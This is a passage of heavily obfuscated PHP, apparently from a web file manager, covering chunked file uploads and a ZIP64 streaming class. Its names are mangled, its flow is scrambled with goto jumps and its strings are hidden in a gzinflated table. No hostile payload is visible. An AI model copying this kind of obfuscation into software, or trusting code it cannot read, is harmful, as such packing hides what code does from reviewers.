$C‹—÷Ô°¿é = @fopen($this->tempFile, $a‘àë‡ª‘Ù[1874]); fseek($C‹—÷Ô°¿é, $AŠÜ‚«Œ‚§); goto a¬ÆÔÓ‹„á; D¤¦Ù¼Š¥‡: } private function checkSize() { $Dø°ÕæÚ© =& $_SERVER[‘®…¢À]; if (phpBuild64() || $this->in[$Dø°ÕæÚ©[78]] < PHP_INT_MAX) { return; } show_json(LNG($Dø°ÕæÚ©[1882]), !1); } private function showJson($F‰÷ÌÊ†¤Ö, $d¢ÀÌŠ½—Õ) { CacheLock::unlock($this->tempFile); if (!$d¢ÀÌŠ½—Õ) { return show_json($F‰÷ÌÊ†¤Ö, $d¢ÀÌŠ½—Õ); } show_json($F‰÷ÌÊ†¤Ö, $d¢ÀÌŠ½—Õ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto F–ƒñ Ÿ×; b‰ˆŠÜô ±: touch($F‹Ÿ•ø½»ë . $E‚‘… œ¯¢[1883]); $Fİé«öÃ†ç = isset($this->in[$E‚‘… œ¯¢[1884]]) ? $this->in[$E‚‘… œ¯¢[1884]] : !1; if (strlen($Fİé«öÃ†ç) < 30) { $Fİé«öÃ†ç = md5(USER_ID . $this->in[$E‚‘… œ¯¢[76]] . $this->fileName . $this->in[$E‚‘… œ¯¢[78]]); } goto AŞ£ºå·­é; F–ƒñ Ÿ×: $E‚‘… œ¯¢ =& $_SERVER[‘®…¢À]; $F‹Ÿ•ø½»ë = TEMP_FILES; @mk_dir($F‹Ÿ•ø½»ë); goto b‰ˆŠÜô ±; AŞ£ºå·­é: $this->tempFile = $F‹Ÿ•ø½»ë . $E‚‘… œ¯¢[1885] . md5($Fİé«öÃ†ç . $this->in[$E‚‘… œ¯¢[1427]]); goto cÇÚŞ„„ ; cÇÚŞ„„ : } private function moveUploadedFile($D•ªâŞ™«„) { $b‹ê°æÑŸ† =& $_SERVER[‘®…¢À]; $Aîµƒ×Ÿ× = $this->uploadFile; if ($Aîµƒ×Ÿ× == $b‹ê°æÑŸ†[1886]) { @file_put_contents($D•ªâŞ™«„, base64_decode($_REQUEST[$b‹ê°æÑŸ†[1887]])); } else { if ($Aîµƒ×Ÿ× == $b‹ê°æÑŸ†[1710]) { $dğ¥¿ÙšÜí = @fopen($D•ªâŞ™«„, $b‹ê°æÑŸ†[1417]); $this->writeTo($Aîµƒ×Ÿ×, $dğ¥¿ÙšÜí, $D•ªâŞ™«„); } else { if (!move_uploaded_file($Aîµƒ×Ÿ×, $D•ªâŞ™«„)) { return !1; } } } return $D•ªâŞ™«„; } private function writeTo($B²áÕÂÓ‘¹, $cŸó¡Û¥²¥, $E¬éÛ½İÃ) { goto CëÍÏÃçÅ•; Dèæôà‰ãí: $eğ°¯Ë¾Ú  = @fopen($B²áÕÂÓ‘¹, $f†ĞÚ§š†[1416]); if (!$eğ°¯Ë¾Ú  || !$cŸó¡Û¥²¥ || !$a÷‰É ©êå) { CacheLock::unlock($fëÏòô¹ÆĞ); return !1; } while (!feof($eğ°¯Ë¾Ú )) { fwrite($cŸó¡Û¥²¥, fread($eğ°¯Ë¾Ú , 1024 * 200)); } goto F›ß­¦Åƒ‚; A¨Û‘Òõñ‡: return !0; goto d»ğîŞÌèÙ; F›ß­¦Åƒ‚: fclose($eğ°¯Ë¾Ú ); fclose($cŸó¡Û¥²¥); CacheLock::unlock($fëÏòô¹ÆĞ); goto A¨Û‘Òõñ‡; CëÍÏÃçÅ•: $f†ĞÚ§š† =& $_SERVER[‘®…¢À]; $fëÏòô¹ÆĞ = $f†ĞÚ§š†[1888] . $E¬éÛ½İÃ; $a÷‰É ©êå = CacheLock::lock($fëÏòô¹ÆĞ, 1); goto Dèæôà‰ãí; d»ğîŞÌèÙ: } private function statusGet() { goto F¡ï ÊÜ–É; eŸïƒ˜³‘Û: $cÍóğ«øØç = !1; if (file_exists($DñŠ±ÀÕãã)) { $cÍóğ«øØç = @file_get_contents($DñŠ±ÀÕãã); } if ($cÍóğ«øØç) { $this->statusData = unserialize($cÍóğ«øØç); } goto b‰•‰µÙ·; F¡ï ÊÜ–É: $F¤É¨èĞ­Š =& $_SERVER[‘®…¢À]; if (is_array($this->statusData)) { return $this->statusData; } $DñŠ±ÀÕãã = $this->tempFile . $F¤É¨èĞ­Š[1889]; goto eŸïƒ˜³‘Û; b‰•‰µÙ·: if (!$this->statusData) { $aÇß›åÑ‚ = array($F¤É¨èĞ­Š[28] => $this->fileName, $F¤É¨èĞ­Š[1876] => 0, $F¤É¨èĞ­Š[1877] => array()); $this->statusSet($aÇß›åÑ‚); } return $this->statusData; goto fçŞ÷òÈ¿Ş; fçŞ÷òÈ¿Ş: } public function statusSet($eæ¸Š«ËÖØ) { $DÜª¦İ¿Ø = $this->tempFile . $_SERVER[‘®…¢À][1889]; if (!$eæ¸Š«ËÖØ) { if (file_exists($DÜª¦İ¿Ø)) { @unlink($DÜª¦İ¿Ø); } return !0; } $this->statusData = $eæ¸Š«ËÖØ; return file_put_contents($DÜª¦İ¿Ø, serialize($eæ¸Š«ËÖØ)); } private function initFileTemp() { $cì¹Éù£×  =& $_SERVER[‘®…¢À]; if (file_exists($this->tempFile)) { return; } $c¡ù»ÙŒÂ‰ = fopen($this->tempFile, $cì¹Éù£× [1890]); fseek($c¡ù»ÙŒÂ‰, $this->in[$cì¹Éù£× [78]] - 1, SEEK_SET); fwrite($c¡ù»ÙŒÂ‰, $cì¹Éù£× [463]); fclose($c¡ù»ÙŒÂ‰); } public function checkChunk() { goto F´°à÷é; F´°à÷é: $FÅ§ŒèŸ»ò =& $_SERVER[‘®…¢À]; $a‹®„ÁµÏ“ = array(); CacheLock::lock($this->tempFile); goto BÒ˜Çô„«; EŞ‘ŠõÇØ™: return $a‹®„ÁµÏ“; goto DŒÁº•ÎÕ; BÒ˜Çô„«: $bïØˆåÕº® = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($bïØˆåÕº®[$FÅ§ŒèŸ»ò[1877]] as $b²÷ƒ®Ş¶Ô) { $D½Ú¯¤æˆÊ = $b²÷ƒ®Ş¶Ô[$FÅ§ŒèŸ»ò[161]]; if ($D½Ú¯¤æˆÊ) { $a‹®„ÁµÏ“[$FÅ§ŒèŸ»ò[1891] . $b²÷ƒ®Ş¶Ô[$FÅ§ŒèŸ»ò[994]]] = $D½Ú¯¤æˆÊ; } } goto EŞ‘ŠõÇØ™; DŒÁº•ÎÕ: } private function checkChunkHash($bÃ°†ñçèµ) { goto E•Î©›´îâ; cí´ëˆÄÆ†: $dì›®‘Ù± = _get($this->in, $eæÜ‘‹Ü[1892]); if (strlen($dì›®‘Ù±) == 32 && IO::hashSimple($this->tempFile) == $d¨ñ’ã­ëó && IO::hashMd5($this->tempFile) == $dì›®‘Ù±) { return !0; } $CÃ‹ŠƒÙĞº = fopen($this->tempFile, $eæÜ‘‹Ü[1120]); goto fäï¸ç“‡; fäï¸ç“‡: $b¡Ù’³À… = !0; foreach ($bÃ°†ñçèµ[$eæÜ‘‹Ü[1877]] as $có¨Ä‘±£¨) { fseek($CÃ‹ŠƒÙĞº, $có¨Ä‘±£¨[$eæÜ‘‹Ü[1879]]); $bìÕ§‘ÚÓó = PathDriverStream::hash($CÃ‹ŠƒÙĞº, $có¨Ä‘±£¨[$eæÜ‘‹Ü[78]]); if ($có¨Ä‘±£¨[$eæÜ‘‹Ü[161]] != $bìÕ§‘ÚÓó) { $b¡Ù’³À… = !1; break; } } fclose($CÃ‹ŠƒÙĞº); goto b±ëê²‰ö¿; b±ëê²‰ö¿: return $b¡Ù’³À…; goto eÍ’å¥÷¬¸; E•Î©›´îâ: $eæÜ‘‹Ü =& $_SERVER[‘®…¢À]; if (count($bÃ°†ñçèµ[$eæÜ‘‹Ü[1877]]) != $bÃ°†ñçèµ[$eæÜ‘‹Ü[1876]]) { return !1; } $d¨ñ’ã­ëó = _get($this->in, $eæÜ‘‹Ü[1884]); goto cí´ëˆÄÆ†; eÍ’å¥÷¬¸: } public static function fileName() { goto aøĞŞ’©œË; bå¾¥©ŒØ“: $BÅÒ¾¢°¯ = strtotime($in[$cŸàÌÇ×«ä[1893]]); $BÅÒ¾¢°¯ = $BÅÒ¾¢°¯ ? $BÅÒ¾¢°¯ : time(); $bò”ª¸é¼ù = strtolower($dìË»•¦Öó); goto fƒø«í¾Ÿò; fƒø«í¾Ÿò: if ($bò”ª¸é¼ù == $cŸàÌÇ×«ä[1894] || $bò”ª¸é¼ù == $cŸàÌÇ×«ä[1895]) { $dìË»•¦Öó = date($cŸàÌÇ×«ä[663], $BÅÒ¾¢°¯) . $cŸàÌÇ×«ä[71] . $in[$cŸàÌÇ×«ä[78]] . $cŸàÌÇ×«ä[1523]; } else { if ($bò”ª¸é¼ù == $cŸàÌÇ×«ä[1896]) { $dìË»•¦Öó = date($cŸàÌÇ×«ä[663], $BÅÒ¾¢°¯) . $cŸàÌÇ×«ä[71] . $in[$cŸàÌÇ×«ä[78]] . $cŸàÌÇ×«ä[1897]; } } return $dìË»•¦Öó; goto C½Õ£°ğĞª; aøĞŞ’©œË: $cŸàÌÇ×«ä =& $_SERVER[‘®…¢À]; global $in; $dìË»•¦Öó = isset($in[$cŸàÌÇ×«ä[28]]) ? $in[$cŸàÌÇ×«ä[28]] : $cŸàÌÇ×«ä[33]; goto eŠ²Ç“Ÿó; eŠ²Ç“Ÿó: if (!empty($_FILES)) { $dìË»•¦Öó = $dìË»•¦Öó ? $dìË»•¦Öó : $_FILES[$cŸàÌÇ×«ä[164]][$cŸàÌÇ×«ä[382]]; } $dìË»•¦Öó = str_replace(array($cŸàÌÇ×«ä[96], $cŸàÌÇ×«ä[8]), array($cŸàÌÇ×«ä[8], $cŸàÌÇ×«ä[94]), trim($dìË»•¦Öó)); if (!is_wap()) { return $dìË»•¦Öó; } goto bå¾¥©ŒØ“; C½Õ£°ğĞª: } private function errorInfo($BÆíµ¢®ì) { $bö†™éĞÕÛ =& $_SERVER[‘®…¢À]; $fĞŒ¤Ñë½ = array($bö†™éĞÕÛ[1898], $bö†™éĞÕÛ[1899], $bö†™éĞÕÛ[1900], $bö†™éĞÕÛ[1901], $bö†™éĞÕÛ[1902], $bö†™éĞÕÛ[1903], $bö†™éĞÕÛ[1904], $bö†™éĞÕÛ[1905]); return $BÆíµ¢®ì . $bö†™éĞÕÛ[4] . $fĞŒ¤Ñë½[$BÆíµ¢®ì]; } } class ZipMake { const VERSION = "\x30\x2e\62\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($Aè¾Ø´îã = null) { $dé¼¥×„ =& $_SERVER[‘®…¢À]; $this->outputStream = fopen($dé¼¥×„[1906], $dé¼¥×„[1176]); $this->outputName = $Aè¾Ø´îã; $this->needHeaders = !0; } public function addFile($cÜÄ±ÄÊÅ×, $a’Òãëø˜) { goto Fºô„ÉŒ; Eé˜ïåõ¯©: $this->addFileFooter($cÜÄ±ÄÊÅ×, $dÊ‰ê¢ï®¿, $aö³µÑ’¶é, $Eà…ªÏ­¡², $e½ÁÀÜ¸Ò, $d˜ğ÷„á÷‚); goto AäÎ¶ØÛÓ«; Fºô„ÉŒ: $cøš‹á±§ =& $_SERVER[‘®…¢À]; $cÜÄ±ÄÊÅ× = $this->filterFilename($cÜÄ±ÄÊÅ×); $dÊ‰ê¢ï®¿ = static::METHOD_STORE; goto A©‡à…¤ßÚ; A‰·ç·¥ÆÎ: while (!feof($fÑÂÖÒšĞê)) { $E–££ß®ù° = fread($fÑÂÖÒšĞê, 1048576); $this->send($E–££ß®ù°); } fclose($fÑÂÖÒšĞê); $aö³µÑ’¶é = hexdec(hash_file($cøš‹á±§[1908], $a’Òãëø˜)); goto Eé˜ïåõ¯©; A©‡à…¤ßÚ: $d˜ğ÷„á÷‚ = $this->addFileHeader($cÜÄ±ÄÊÅ×, $dÊ‰ê¢ï®¿); $Eà…ªÏ­¡² = $e½ÁÀÜ¸Ò = filesize($a’Òãëø˜); $fÑÂÖÒšĞê = fopen($a’Òãëø˜, $cøš‹á±§[1907]); goto A‰·ç·¥ÆÎ; AäÎ¶ØÛÓ«: } public function addFileFromStream($Bî–·æ¾åç, $E“ºåø…ª¥) { goto f¸è‚Ò³®á; F Š’Ô«öÑ: $cš¢°‰Æª = hash_init($_SERVER[‘®…¢À][1908]); while (!feof($E“ºåø…ª¥)) { $cø¿ĞÊøàÁ = fread($E“ºåø…ª¥, 1048576); hash_update($cš¢°‰Æª, $cø¿ĞÊøàÁ); $this->send($cø¿ĞÊøàÁ); } $cÒÕ„Ç²»Ñ = hexdec(hash_final($cš¢°‰Æª)); goto dÉÑ©©¢Úõ; dÉÑ©©¢Úõ: $this->addFileFooter($Bî–·æ¾åç, $FÊ±â¹ÜÖ–, $cÒÕ„Ç²»Ñ, $CØƒÛ£Ç’, $C¿òÏÄ°—°, $Eõ°óíêŞ÷); goto bî·àÇ¤ƒ; f¸è‚Ò³®á: $Bî–·æ¾åç = $this->filterFilename($Bî–·æ¾åç); $FÊ±â¹ÜÖ– = static::METHOD_STORE; $Eõ°óíêŞ÷ = $this->addFileHeader($Bî–·æ¾åç, $FÊ±â¹ÜÖ–); goto D¶·ñÄ‡•È; D¶·ñÄ‡•È: fseek($E“ºåø…ª¥, 0, SEEK_END); $CØƒÛ£Ç’ = $C¿òÏÄ°—° = ftell($E“ºåø…ª¥); rewind($E“ºåø…ª¥); goto F Š’Ô«öÑ; bî·àÇ¤ƒ: } public function finish() { foreach ($this->files as $Eî¸É©­ç) { $this->addCdrFile($Eî¸É©­ç); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($B£„ÖŠğğ, $D±±èÒğ) { goto eÉÌ”Ñ”Ó; B¾½¥Ú¥·ß: return strlen($fÛÏïÆêäê) + $b®½îîÚÓ† + strlen($Dâ­‰‰ ™ó); goto a‡ì—º„¡Í; eÉÌ”Ñ”Ó: $fíÎ¨ĞªÎ° =& $_SERVER[‘®…¢À]; $B£„ÖŠğğ = preg_replace($fíÎ¨ĞªÎ°[1909], $fíÎ¨ĞªÎ°[33], $B£„ÖŠğğ); $b®½îîÚÓ† = strlen($B£„ÖŠğğ); goto fˆßñ÷‘; fˆßñ÷‘: $bêâŞÉÈ‡¿ = $this->dosTime(time()); $aŒæ ¿¸öÃ = array(array($fíÎ¨ĞªÎ°[1910], static::FILE_HEADER_SIGNATURE), array($fíÎ¨ĞªÎ°[1911], static::ZIP_VERSION_64), array($fíÎ¨ĞªÎ°[1911], 8), array($fíÎ¨ĞªÎ°[1911], $D±±èÒğ), array($fíÎ¨ĞªÎ°[1910], $bêâŞÉÈ‡¿), array($fíÎ¨ĞªÎ°[1910], 0), array($fíÎ¨ĞªÎ°[1910], 4294967295), array($fíÎ¨ĞªÎ°[1910], 4294967295), array($fíÎ¨ĞªÎ°[1911], $b®½îîÚÓ†), array($fíÎ¨ĞªÎ°[1911], 32)); $A«Ñ–‡ô³Õ = array(array($fíÎ¨ĞªÎ°[1911], 1), array($fíÎ¨ĞªÎ°[1911], 28), array($fíÎ¨ĞªÎ°[1912], 0), array($fíÎ¨ĞªÎ°[1912], 0), array($fíÎ¨ĞªÎ°[1912], 0), array($fíÎ¨ĞªÎ°[1910], 0)); goto C¡Ø ß‰ñ¶; C¡Ø ß‰ñ¶: $fÛÏïÆêäê = $this->packFields($aŒæ ¿¸öÃ); $Dâ­‰‰ ™ó = $this->packFields($A«Ñ–‡ô³Õ); $this->send($fÛÏïÆêäê . $B£„ÖŠğğ . $Dâ­‰‰ ™ó); goto B¾½¥Ú¥·ß; a‡ì—º„¡Í: } protected function addFileFooter($fˆ¾‚¹…ØÆ, $e¥¸šÇÄ¾«, $E©Ï„õÎ‚Ö, $Fğ‡Šè, $A¶¤Ä¯ƒ“…, $fôµìÑ‹Í¥) { $F¿Úåƒæ¶í =& $_SERVER[‘®…¢À]; $cÑğŒ¤ç‡® = array(array($F¿Úåƒæ¶í[1910], static::DATA_DESCRIPTOR_SIGNATURE), array($F¿Úåƒæ¶í[1910], $E©Ï„õÎ‚Ö), array($F¿Úåƒæ¶í[1912], $Fğ‡Šè), array($F¿Úåƒæ¶í[1912], $A¶¤Ä¯ƒ“…)); $dâô•Ñ¢ğæ = $this->packFields($cÑğŒ¤ç‡®); $this->send($dâô•Ñ¢ğæ); $AïàïÖÙğ = $fôµìÑ‹Í¥ + $Fğ‡Šè + $Dšß‘‹…†Ü; $this->addToCdr($fˆ¾‚¹…ØÆ, $e¥¸šÇÄ¾«, $E©Ï„õÎ‚Ö, $Fğ‡Šè, $A¶¤Ä¯ƒ“…, $AïàïÖÙğ); } private function addToCdr($a­ˆäĞˆÙ˜, $CÖÃÉ¨‡Éõ, $Aâ¡…Ä„á, $BéÀë¦¾ˆ, $c…ğ¨í†à, $aï±²ƒñ¯“) { $this->files[] = array($a­ˆäĞˆÙ˜, $CÖÃÉ¨‡Éõ, $Aâ¡…Ä„á, $BéÀë¦¾ˆ, $c…ğ¨í†à, $this->ofs); $this->ofs += $aï±²ƒñ¯“; } protected function addCdrFile($E™½ŸÁ‘–ì) { goto b¥»¢Ã¼†è; Bâ”ÏµŒ: $dŠì«£ÚâÒ = $this->packFields($F§¸™¨‹°); $b½ÚÚ²‚ Ï = $this->packFields($Eİ—êÁò§Ê); $D®˜Œ¾¦ÁÜ = $dŠì«£ÚâÒ . $cÏšŸ”Ò . $dĞ¨²·òĞ” . $b½ÚÚ²‚ Ï; goto a­’’Î”÷; b¥»¢Ã¼†è: $fŠ÷Ä´Õ¨æ =& $_SERVER[‘®…¢À]; list($cÏšŸ”Ò, $fé ±¼ĞÉ, $AŒĞÜ©ö¹, $AŠìÏËî“, $bª™ù£îÆ, $b”Ä©ÚÈ™İ) = $E™½ŸÁ‘–ì; $dĞ¨²·òĞ” = $fŠ÷Ä´Õ¨æ[33]; goto eàç—êˆ²Š; eàç—êˆ²Š: $dÜ‡™íôö‚ = $this->dosTime(time()); $F§¸™¨‹° = array(array($fŠ÷Ä´Õ¨æ[1910], static::CDR_FILE_SIGNATURE), array($fŠ÷Ä´Õ¨æ[1911], static::ZIP_VERSION_64), array($fŠ÷Ä´Õ¨æ[1911], static::ZIP_VERSION_64), array($fŠ÷Ä´Õ¨æ[1911], 8), array($fŠ÷Ä´Õ¨æ[1911], $fé ±¼ĞÉ), array($fŠ÷Ä´Õ¨æ[1910], $dÜ‡™íôö‚), array($fŠ÷Ä´Õ¨æ[1910], $AŒĞÜ©ö¹), array($fŠ÷Ä´Õ¨æ[1910], 4294967295), array($fŠ÷Ä´Õ¨æ[1910], 4294967295), array($fŠ÷Ä´Õ¨æ[1911], strlen($cÏšŸ”Ò)), array($fŠ÷Ä´Õ¨æ[1911], 32), array($fŠ÷Ä´Õ¨æ[1911], strlen($dĞ¨²·òĞ”)), array($fŠ÷Ä´Õ¨æ[1911], 0), array($fŠ÷Ä´Õ¨æ[1911], 0), array($fŠ÷Ä´Õ¨æ[1910], 32), array($fŠ÷Ä´Õ¨æ[1910], 4294967295)); $Eİ—êÁò§Ê = array(array($fŠ÷Ä´Õ¨æ[1911], 1), array($fŠ÷Ä´Õ¨æ[1911], 28), array($fŠ÷Ä´Õ¨æ[1912], $bª™ù£îÆ), array($fŠ÷Ä´Õ¨æ[1912], $AŠìÏËî“), array($fŠ÷Ä´Õ¨æ[1912], $b”Ä©ÚÈ™İ), array($fŠ÷Ä´Õ¨æ[1910], 0)); goto Bâ”ÏµŒ; a­’’Î”÷: $this->send($D®˜Œ¾¦ÁÜ); $this->cdr_ofs += strlen($D®˜Œ¾¦ÁÜ); goto fí–’¦©¯å; fí–’¦©¯å: } protected function addCdr64Eof() { goto D¢¤¬¸àƒ; E™£Ì¢Ìëä: $c£·ÅöÔ¬½ = $this->ofs; $C¤öîˆŠœ× = array(array($bøßÚ˜Õ¶[1910], static::ZIP64_CDR_EOF_SIGNATURE), array($bøßÚ˜Õ¶[1912], 44), array($bøßÚ˜Õ¶[1911], static::ZIP_VERSION_64), array($bøßÚ˜Õ¶[1911], static::ZIP_VERSION_64), array($bøßÚ˜Õ¶[1910], 0), array($bøßÚ˜Õ¶[1910], 0), array($bøßÚ˜Õ¶[1912], $dÂâæ¶Ìˆí), array($bøßÚ˜Õ¶[1912], $dÂâæ¶Ìˆí), array($bøßÚ˜Õ¶[1912], $E¢‡øñˆ£²), array($bøßÚ˜Õ¶[1912], $c£·ÅöÔ¬½)); $D¤ÇªÆ†’À = $this->packFields($C¤öîˆŠœ×); goto b¸®ôŒ†óñ; b¸®ôŒ†óñ: $this->send($D¤ÇªÆ†’À); goto Bâ¡ˆ‰¨¬Æ; D¢¤¬¸àƒ: $bøßÚ˜Õ¶ =& $_SERVER[‘®…¢À]; $dÂâæ¶Ìˆí = count($this->files); $E¢‡øñˆ£² = $this->cdr_ofs; goto E™£Ì¢Ìëä; Bâ¡ˆ‰¨¬Æ: } protected function addCdr64Locator() { goto e™ÚÇ‹éÔ§; dØ§³Ï‘ì»: $this->send($f†©’¼òÚ‡); goto BŒ©¯¢Öè; Fô‰ÕÁ¿¤ã: $bí„†Ÿ§µ = $this->ofs; $aõ’­øÖæ = array(array($C·â¥ª£êÍ[1910], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($C·â¥ª£êÍ[1910], 0), array($C·â¥ª£êÍ[1912], $bí„†Ÿ§µ + $DÄÀÏ‘òÄÁ), array($C·â¥ª£êÍ[1910], 1)); $f†©’¼òÚ‡ = $this->packFields($aõ’­øÖæ); goto dØ§³Ï‘ì»; e™ÚÇ‹éÔ§: $C·â¥ª£êÍ =& $_SERVER[‘®…¢À]; $AŠÊ…Ê¬‘Õ = count($this->files); $DÄÀÏ‘òÄÁ = $this->cdr_ofs; goto Fô‰ÕÁ¿¤ã; BŒ©¯¢Öè: } protected function addCdrEof() { goto B§ğ—µòÖº; B§ğ—µòÖº: $F»‘ç˜å‹ =& $_SERVER[‘®…¢À]; $CÓá»Ü±‚ğ = count($this->files); $FÑÌåğÎ­£ = $this->cdr_ofs; goto B²¬à¤×ø·; B²¬à¤×ø·: $báù‘ó¡¡ = $this->ofs; $AÍ¥¾§Æ“² = $F»‘ç˜å‹[33]; $FòØñ¯çš® = array(array($F»‘ç˜å‹[1910], static::CDR_EOF_SIGNATURE), array($F»‘ç˜å‹[1911], 0), array($F»‘ç˜å‹[1911], 0), array($F»‘ç˜å‹[1911], $CÓá»Ü±‚ğ), array($F»‘ç˜å‹[1911], $CÓá»Ü±‚ğ), array($F»‘ç˜å‹[1910], 4294967295), array($F»‘ç˜å‹[1910], 4294967295), array($F»‘ç˜å‹[1911], strlen($AÍ¥¾§Æ“²))); goto FƒŸ‰ÒÉ¦³; FƒŸ‰ÒÉ¦³: $a»“ÜõÀÌ‚ = $this->packFields($FòØñ¯çš®) . $AÍ¥¾§Æ“²; $this->send($a»“ÜõÀÌ‚); goto D’ª‚ÔÓËå; D’ª‚ÔÓËå: } protected function addCdr() { foreach ($this->files as $FŞòËğƒÅØ) { $this->addCdrFile($FŞòËğƒÅØ); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $DñğÃéñì® =& $_SERVER[‘®…¢À]; $CİïŠ´©øö = $DñğÃéñì®[199]; if ($this->outputName) { $cìï¢ƒ¢÷Ì = trim(str_replace(array($DñğÃéñì®[114], $DñğÃéñì®[55], $DñğÃéñì®[96], $DñğÃéñì®[68], $DñğÃéñì®[214], $DñğÃéñì®[702]), $DñğÃéñì®[33], $this->outputName)); $Fõİ†ÎÚ¥ = rawurlencode($cìï¢ƒ¢÷Ì); $CİïŠ´©øö .= "\x3b\40\x66\151\x6c\145\156\x61\155\x65\52\x3d\165\x74\146\55\70\x27\47{$Fõİ†ÎÚ¥}"; } $aö°Ğ¤Ó´ = array($DñğÃéñì®[196] => $DñğÃéñì®[1913], $DñğÃéñì®[1914] => $CİïŠ´©øö, $DñğÃéñì®[1915] => $DñğÃéñì®[1916], $DñğÃéñì®[1917] => $DñğÃéñì®[1918], $DñğÃéñì®[1919] => $DñğÃéñì®[1920]); foreach ($aö°Ğ¤Ó´ as $F¹šÊáâ‚Æ => $b°Å‹ø¹§) { header($F¹šÊáâ‚Æ . $DñğÃéñì®[861] . $b°Å‹ø¹§); } } protected function send($A±‹½½ù) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $A±‹½½ù); } protected final function dosTime($b‘…ëÊ˜ÇÃ) { $dØô®­¶ì© =& $_SERVER[‘®…¢À]; $Bà‡Í£–Ö° = getdate($b‘…ëÊ˜ÇÃ); if ($Bà‡Í£–Ö°[$dØô®­¶ì©[1620]] < 1980) { $Bà‡Í£–Ö° = array($dØô®­¶ì©[1620] => 1980, $dØô®­¶ì©[1921] => 1, $dØô®­¶ì©[1922] => 1, $dØô®­¶ì©[1923] => 0, $dØô®­¶ì©[1924] => 0, $dØô®­¶ì©[1925] => 0); } $Bà‡Í£–Ö°[$dØô®­¶ì©[1620]] -= 1980; return $Bà‡Í£–Ö°[$dØô®­¶ì©[1620]] << 25 | $Bà‡Í£–Ö°[$dØô®­¶ì©[1921]] << 21 | $Bà‡Í£–Ö°[$dØô®­¶ì©[1922]] << 16 | $Bà‡Í£–Ö°[$dØô®­¶ì©[1923]] << 11 | $Bà‡Í£–Ö°[$dØô®­¶ì©[1924]] << 5 | $Bà‡Í£–Ö°[$dØô®­¶ì©[1925]] >> 1; } protected function packFields($BÖªƒ‰š‚ö) { $c·ŸÏæˆ =& $_SERVER[‘®…¢À]; $e¹†ë²Å‚ = $c·ŸÏæˆ[33]; $EÊœ©ùÂò = array(); foreach ($BÖªƒ‰š‚ö as $f”¶´„¤Ò) { $e¹†ë²Å‚ .= $f”¶´„¤Ò[0]; $EÊœ©ùÂò[] = $f”¶´„¤Ò[1]; } array_unshift($EÊœ©ùÂò, $e¹†ë²Å‚); return call_user_func_array($c·ŸÏæˆ[1926], $EÊœ©ùÂò); } protected function filterFilename($cƒ…Õ¸°‚Ç) { $F½ö³à¬Ø‰ =& $_SERVER[‘®…¢À]; return str_replace(array($F½ö³à¬Ø‰[96], $F½ö³à¬Ø‰[4], $F½ö³à¬Ø‰[173], $F½ö³à¬Ø‰[70], $F½ö³à¬Ø‰[114], $F½ö³à¬Ø‰[906], $F½ö³à¬Ø‰[909], $F½ö³à¬Ø‰[268]), $F½ö³à¬Ø‰[71], $cƒ…Õ¸°‚Ç); } } class ZipStream { } goto bÖÃ‘›·Ûâ; BÈÆÙ“ËÆ¦: define($_SERVER[‘®…¢À][0], $_SERVER[‘®…¢À][1]); $_SERVER[Á] = explode($_SERVER[‘®…¢À][2], gzinflate(substr($_SERVER[‘®…¢À][3], 10, -8))); function Model($DÄÊ±£İš£ = '', $d·İ‡ëÅ¥õ = '', $c—×—¬˜ó = '') { goto aŠŠŠ‚¡”; fòÓ¢¼ùÄ : if (isset($eã •ßé×Â[$Bƒ—„°Ê•È])) { return $eã •ßé×Â[$Bƒ—„°Ê•È]; } if ($DÄÊ±£İš£) { $DÄÊ±£İš£ = strtoupper($DÄÊ±£İš£[0]) . substr($DÄÊ±£İš£, 1); $C‰àŸ‚ªÄÇ = $DÄÊ±£İš£ . $Eò½İ‘›Ç£[1]; if (class_exists($C‰àŸ‚ªÄÇ)) { $eã •ßé×Â[$Bƒ—„°Ê•È] = new $C‰àŸ‚ªÄÇ(); return $eã •ßé×Â[$Bƒ—„°Ê•È]; } } if (!$c—×—¬˜ó) { $c—×—¬˜ó = $GLOBALS[$Eò½İ‘›Ç£[2]][$Eò½İ‘›Ç£[3]]; } goto B£ğİ£ŠÉ; B£ğİ£ŠÉ: $eã •ßé×Â[$Bƒ—„°Ê•È] = new ModelBase($DÄÊ±£İš£, $d·İ‡ëÅ¥õ, $c—×—¬˜ó); return $eã •ßé×Â[$Bƒ—„°Ê•È]; goto d™¦–Úƒä; aŠŠŠ‚¡”: $Eò½İ‘›Ç£ =& $_SERVER[Á]; static $eã •ßé×Â = array(); $Bƒ—„°Ê•È = strtolower($d·İ‡ëÅ¥õ . $Eò½İ‘›Ç£[0] . $DÄÊ±£İš£); goto fòÓ¢¼ùÄ ; d™¦–Úƒä: } goto A„‰”Şµ“; eë¥è ™–Ì: function beforeShutdownError($c¡ššŠÏ¿½ = false, $DŞòè†÷¬é = '', $aˆ­Şò÷İö = '', $d¶¹ù÷Û® = 0) { $DÓŒ‡ò™‰Ñ =& $_SERVER[Á]; switch ($c¡ššŠÏ¿½) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $dË¥‘¢çÕ¥ = $DÓŒ‡ò™‰Ñ[38]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $dË¥‘¢çÕ¥ = $DÓŒ‡ò™‰Ñ[39]; break; case E_STRICT: $dË¥‘¢çÕ¥ = $DÓŒ‡ò™‰Ñ[40]; break; case E_NOTICE: case E_USER_NOTICE: $dË¥‘¢çÕ¥ = $DÓŒ‡ò™‰Ñ[41]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $dË¥‘¢çÕ¥ = $DÓŒ‡ò™‰Ñ[42]; break; 